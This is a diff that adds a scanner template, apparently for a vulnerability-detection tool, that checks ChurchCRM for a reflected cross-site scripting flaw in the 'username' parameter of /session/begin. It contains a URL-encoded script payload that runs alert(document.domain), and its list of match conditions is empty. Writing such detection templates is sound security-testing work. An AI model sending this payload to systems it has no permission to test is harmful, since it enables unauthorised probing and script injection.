@@ -1,0 +1,17 @@
+id: churchcrm-xss
+brief:
+    title: ChurchCRM - Cross-Site Scripting
+    by: pikpikcu
+    level: medium
+    about: A reflected cross-site scripting (XSS) vulnerability was discovered in ChurchCRM via the 'username' parameter in /session/begin.
+    label:
+        - churchcrm
+        - xss
+        - crm
+        - vuln
+    score: CVSS:6.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      signs: []
